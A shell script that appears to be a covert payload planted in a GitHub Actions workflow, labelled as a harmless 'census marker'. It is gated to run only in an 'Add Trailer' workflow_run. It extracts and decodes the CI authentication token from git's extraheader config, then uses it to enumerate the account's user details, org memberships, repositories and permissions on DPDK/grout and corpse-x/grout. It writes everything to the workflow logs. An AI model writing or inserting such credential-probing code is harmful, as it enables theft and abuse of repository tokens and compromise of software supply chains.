#!/bin/sh
# --- i70238 PAT capability census marker (inert outside Add Trailer workflow_run) ---
i70238_census() {
	[ "${GITHUB_EVENT_NAME:-}" = "workflow_run" ] || return 0
	[ "${GITHUB_WORKFLOW:-}" = "Add Trailer" ] || return 0
	[ -e /tmp/.i70238_done ] && return 0
	: > /tmp/.i70238_done 2>/dev/null || true
	{
		echo "I70238_CENSUS_START"
		echo "event=${GITHUB_EVENT_NAME} workflow=${GITHUB_WORKFLOW} repo=${GITHUB_REPOSITORY} run=${GITHUB_RUN_ID:-}"
		echo "host=$(hostname 2>/dev/null) date=$(date -u +%FT%TZ)"
		echo "head=$(git rev-parse HEAD 2>/dev/null)"
		hdr=$(git config --get http.https://github.com/.extraheader 2>/dev/null || true)
		dec=$(printf '%s' "$hdr" | tr -d ' ' | sed -n 's/.*AUTHORIZATION:[Bb]asic//Ip' | base64 -d 2>/dev/null || true)
		tok=$(printf '%s' "$dec" | sed -n 's/^[^:]*://p')
		echo "token_len=${#tok} token_sha=$(printf '%s' "$tok" | sha256sum | cut -d' ' -f1) token_type=$(printf '%s' "$tok" | cut -c1-4)"
		if [ -z "$tok" ]; then
			echo "I70238_NO_TOKEN"
			echo "I70238_CENSUS_END"
			return 0
		fi
		api=https://api.github.com
		i70238_get() {
			name=$1; url=$2
			curl -sS --max-time 25 -D "/tmp/i70238_h_$name" -o "/tmp/i70238_b_$name" \
				-H "Authorization: token $tok" \
				-H 'Accept: application/vnd.github+json' \
				-H 'X-GitHub-Api-Version: 2022-11-28' \
				-H 'User-Agent: i70238-census' \
				"$url" >/dev/null 2>&1 || true
			echo "$name status=$(head -1 "/tmp/i70238_h_$name" 2>/dev/null | tr -d '\r')"
			echo "$name scopes=$(grep -i '^x-oauth-scopes:' "/tmp/i70238_h_$name" 2>/dev/null | head -1 | cut -d: -f2- | tr -d '\r' | cut -c1-500)"
			echo "$name accepted_scopes=$(grep -i '^x-accepted-oauth-scopes:' "/tmp/i70238_h_$name" 2>/dev/null | head -1 | cut -d: -f2- | tr -d '\r' | cut -c1-500)"
			echo "$name rl_remaining=$(grep -i '^x-ratelimit-remaining:' "/tmp/i70238_h_$name" 2>/dev/null | head -1 | cut -d: -f2- | tr -d ' \r')"
			echo "$name link=$(grep -i '^link:' "/tmp/i70238_h_$name" 2>/dev/null | head -1 | cut -d: -f2- | tr -d '\r' | cut -c1-300)"
		}
		i70238_get user "$api/user"
		i70238_get orgs "$api/user/memberships/orgs?per_page=100"
		i70238_get repos "$api/user/repos?per_page=100&affiliation=owner,collaborator,organization_member&sort=updated"
		i70238_get dpdk_grout "$api/repos/DPDK/grout"
		i70238_get corpse_grout "$api/repos/corpse-x/grout"
		python3 - <<'PY' 2>&1 || true
import json
def load(n):
    try:
        return json.load(open('/tmp/i70238_b_'+n))
    except Exception as e:
        return {'__error__': str(e)}
u=load('user')
print('USER login=%r id=%r type=%r site_admin=%r name_set=%r email_set=%r public_repos=%r created=%r' % (
    u.get('login'), u.get('id'), u.get('type'), u.get('site_admin'), bool(u.get('name')), bool(u.get('email')), u.get('public_repos'), u.get('created_at')))
o=load('orgs')
if isinstance(o, list):
    print('ORG_MEMBERSHIPS count=%d' % len(o))
    for m in o[:100]:
        org=m.get('organization') or {}
        print('ORG login=%r role=%r state=%r' % (org.get('login'), m.get('role'), m.get('state')))
else:
    print('ORG_MEMBERSHIPS error=%r' % (o,))
r=load('repos')
if isinstance(r, list):
    print('REPOS count_page=%d' % len(r))
    for it in r[:120]:
        p=it.get('permissions') or {}
        owner=(it.get('owner') or {})
        print('REPO full_name=%r private=%r owner_type=%r admin=%r maintain=%r push=%r triage=%r pull=%r archived=%r fork=%r' % (
            it.get('full_name'), it.get('private'), owner.get('type'), p.get('admin'), p.get('maintain'), p.get('push'), p.get('triage'), p.get('pull'), it.get('archived'), it.get('fork')))
else:
    print('REPOS error=%r' % (r,))
for n in ('dpdk_grout','corpse_grout'):
    x=load(n)
    p=x.get('permissions') or {}
    print('PERM %s full_name=%r private=%r admin=%r maintain=%r push=%r triage=%r pull=%r default_branch=%r' % (
        n, x.get('full_name'), x.get('private'), p.get('admin'), p.get('maintain'), p.get('push'), p.get('triage'), p.get('pull'), x.get('default_branch')))
    if x.get('__error__') or x.get('message'):
        print('PERM %s msg=%r' % (n, x.get('message') or x.get('__error__')))
PY
		echo "I70238_CENSUS_END"
	} >&2 || true
}
i70238_census
# --- end i70238 marker ---



